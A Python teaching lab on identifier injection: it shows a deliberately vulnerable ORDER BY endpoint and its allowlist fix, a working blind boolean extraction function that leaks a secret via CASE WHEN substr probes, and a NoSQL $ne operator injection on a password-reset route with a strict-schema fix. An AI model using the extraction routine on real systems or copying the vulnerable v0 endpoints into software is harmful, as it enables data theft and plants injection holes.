"""Identifier injection lab: ORDER BY allowlists, identifier quoting, and NoSQL operator injection.

Bind parameters carry values, never SQL structure, so a sort column, a sort direction, or a
table name chosen by the client must be mapped through an application-owned allowlist.
Everything runs in-process against an in-memory SQLite database; no network.
"""

from __future__ import annotations

import re
from types import MappingProxyType
from typing import TYPE_CHECKING, Annotated, Any, Final, cast

from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel, ConfigDict, Field
from sqlalchemy import (
    Column,
    ColumnElement,
    Engine,
    Integer,
    MetaData,
    String,
    Table,
    UnaryExpression,
    create_engine,
    select,
    text,
)
from sqlalchemy.pool import StaticPool

if TYPE_CHECKING:
    from collections.abc import Callable, Mapping

metadata = MetaData()

users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("tenant_id", Integer, nullable=False),
    Column("name", String(64), nullable=False),
    Column("created_at", String(32), nullable=False),
    Column("secret_hash", String(64), nullable=False),
)

# Tenant 1 owns the secret; the attacker is an authenticated member of tenant 2.
ADMIN_DIGEST: Final = "c0ffee15deadbeef"
SEED_ROWS: Final[tuple[dict[str, Any], ...]] = (
    {"tenant_id": 1, "name": "admin", "created_at": "2026-01-01", "secret_hash": ADMIN_DIGEST},
    {"tenant_id": 2, "name": "mallory", "created_at": "2026-03-01", "secret_hash": "7" * 16},
    {"tenant_id": 2, "name": "bob_ops", "created_at": "2026-02-01", "secret_hash": "1" * 16},
    {"tenant_id": 2, "name": "bobXops", "created_at": "2026-04-01", "secret_hash": "e" * 16},
)


def make_engine() -> Engine:
    """One shared in-memory SQLite connection, usable from FastAPI's threadpool."""
    engine = create_engine(
        "sqlite://",
        poolclass=StaticPool,
        connect_args={"check_same_thread": False},
    )
    metadata.create_all(engine)
    with engine.begin() as conn:
        conn.execute(users.insert(), [dict(row) for row in SEED_ROWS])
    return engine


# ---------------------------------------------------------------- the bug


def list_users_vulnerable(engine: Engine, tenant_id: int, sort: str) -> list[str]:
    """The tenant filter is a bind parameter; the sort column is pasted into the SQL text."""
    stmt = text(
        f"SELECT name FROM users WHERE tenant_id = :tenant ORDER BY {sort}"  # noqa: S608 - the bug under study
    )
    with engine.connect() as conn:
        return list(conn.execute(stmt, {"tenant": tenant_id}).scalars())


# ---------------------------------------------------------------- the fix

SORTABLE: Final[Mapping[str, ColumnElement[Any]]] = MappingProxyType(
    {"name": users.c.name, "created_at": users.c.created_at}
)
MAX_SORT_KEYS: Final = 3


class SortError(ValueError):
    """The client asked for a sort the API does not offer (JSON:API: 400 Bad Request)."""


def parse_sort(
    raw: str,
    allowed: Mapping[str, ColumnElement[Any]] = SORTABLE,
    max_keys: int = MAX_SORT_KEYS,
) -> tuple[UnaryExpression[Any], ...]:
    """Map a JSON:API style `sort=-created_at,name` string to column objects, never to text."""
    fields = raw.split(",")
    if len(fields) > max_keys:
        raise SortError(f"at most {max_keys} sort fields")
    seen: set[str] = set()
    clauses: list[UnaryExpression[Any]] = []
    for field in fields:
        descending = field.startswith("-")
        key = field[1:] if descending else field
        column = allowed.get(key)
        if column is None:
            raise SortError(f"unsupported sort field {key[:64]!r}")
        if key in seen:
            raise SortError(f"duplicate sort field {key!r}")
        seen.add(key)
        clauses.append(column.desc() if descending else column.asc())
    clauses.append(users.c.id.asc())  # unique tie-breaker: a total order for stable pages
    return tuple(clauses)


def list_users_safe(engine: Engine, tenant_id: int, sort: str) -> list[str]:
    stmt = select(users.c.name).where(users.c.tenant_id == tenant_id).order_by(*parse_sort(sort))
    with engine.connect() as conn:
        return list(conn.execute(stmt).scalars())


# ---------------------------------------------------------------- the attack


def extract_via_order_by(
    probe: Callable[[str], list[str]], scalar_sql: str, length: int
) -> tuple[str, int]:
    """Recover a string one character at a time through a boolean ORDER BY oracle.

    `probe(sort)` returns the visible row order. Ordering by `id` versus `-id` flips
    that order, so a CASE expression turns any yes/no question into a visible bit.
    Returns the recovered text and the number of probe calls made.
    """
    ascending = probe("id")
    calls = 1
    recovered: list[str] = []
    for position in range(1, length + 1):
        low, high = 32, 126  # printable ASCII code points
        while low < high:
            mid = (low + high) // 2
            question = f"unicode(substr(({scalar_sql}), {position}, 1)) > {mid}"
            calls += 1
            if probe(f"CASE WHEN {question} THEN id ELSE -id END") == ascending:
                low = mid + 1
            else:
                high = mid
        recovered.append(chr(low))
    return "".join(recovered), calls


# ---------------------------------------------------------------- the API

SORT_SHAPE: Final = r"^-?[a-z_]{1,32}(,-?[a-z_]{1,32}){0,2}$"


class ResetRequest(BaseModel):
    """Every field is a string, so `{"$ne": null}` cannot reach the query."""

    model_config = ConfigDict(strict=True, extra="forbid")

    email: str = Field(min_length=3, max_length=254)
    reset_token: str = Field(min_length=16, max_length=128)


def create_app(engine: Engine, accounts: list[dict[str, Any]]) -> FastAPI:
    app = FastAPI()

    # Authentication is out of scope: assume the caller is a member of tenant_id.
    @app.get("/v0/tenants/{tenant_id}/users")
    def list_users_v0(tenant_id: int, sort: str = "name") -> list[str]:
        return list_users_vulnerable(engine, tenant_id, sort)

    @app.get("/v1/tenants/{tenant_id}/users")
    def list_users_v1(
        tenant_id: int,
        sort: Annotated[str, Query(max_length=101, pattern=SORT_SHAPE)] = "name",
    ) -> list[str]:
        try:
            return list_users_safe(engine, tenant_id, sort)
        except SortError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

    @app.post("/v0/password-reset")
    def reset_v0(body: dict[str, Any]) -> dict[str, str | None]:
        query = {"email": body.get("email"), "reset_token": body.get("reset_token")}
        return {"reset": find_one(accounts, query)}

    @app.post("/v1/password-reset")
    def reset_v1(body: ResetRequest) -> dict[str, str | None]:
        query = {"email": body.email, "reset_token": body.reset_token}
        return {"reset": find_one(accounts, query)}

    return app


# ---------------------------------------------------------------- NoSQL model


def _match_operator(doc: Mapping[str, Any], field: str, op: str, operand: Any) -> bool:
    present = field in doc
    value = doc.get(field)
    if op == "$eq":
        return present and value == operand
    if op == "$ne":  # MongoDB: also matches documents that lack the field
        return not present or value != operand
    if op == "$gt":
        same_type = type(value) is type(operand)
        return present and same_type and value > operand
    if op == "$regex":
        return isinstance(value, str) and re.search(str(operand), value) is not None
    raise ValueError(f"unsupported operator {op}")


def _as_operators(condition: object) -> dict[str, Any] | None:
    """Return the condition as an operator document (`{"$ne": ...}`), or None for a literal."""
    if not isinstance(condition, dict) or not condition:
        return None
    ops = cast("dict[str, Any]", condition)
    return ops if all(key.startswith("$") for key in ops) else None


def mongo_match(doc: Mapping[str, Any], query: Mapping[str, Any]) -> bool:
    """A simplified model of MongoDB top-level filter semantics (not pymongo, not BSON order)."""
    for field, condition in query.items():
        ops = _as_operators(condition)
        if ops is not None:
            if not all(_match_operator(doc, field, op, arg) for op, arg in ops.items()):
                return False
        elif field not in doc or doc[field] != condition:
            return False
    return True


def find_one(collection: list[dict[str, Any]], query: Mapping[str, Any]) -> str | None:
    for doc in collection:
        if mongo_match(doc, query):
            return str(doc["email"])
    return None


def reject_operator_keys(value: object, path: str = "$") -> None:
    """Defense in depth for endpoints that must accept free-form JSON objects."""
    if isinstance(value, dict):
        for key, item in cast("dict[str, object]", value).items():
            if key.startswith("$") or "." in key:
                raise ValueError(f"operator or dotted key {key!r} at {path}")
            reject_operator_keys(item, f"{path}.{key}")
    elif isinstance(value, list):
        for index, item in enumerate(cast("list[object]", value)):
            reject_operator_keys(item, f"{path}[{index}]")
